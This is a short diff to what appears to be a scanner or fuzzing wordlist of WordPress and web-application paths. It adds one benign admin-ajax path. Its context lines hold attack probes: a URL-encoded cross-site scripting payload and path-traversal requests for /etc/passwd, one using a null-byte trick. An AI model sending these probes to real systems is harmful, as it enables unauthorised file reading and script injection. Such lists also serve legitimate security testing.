@@ -133,3 +133,4 @@
 /wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
 /wt3/forceSave.php?file=/etc/passwd
+/wp-admin/admin-ajax.php
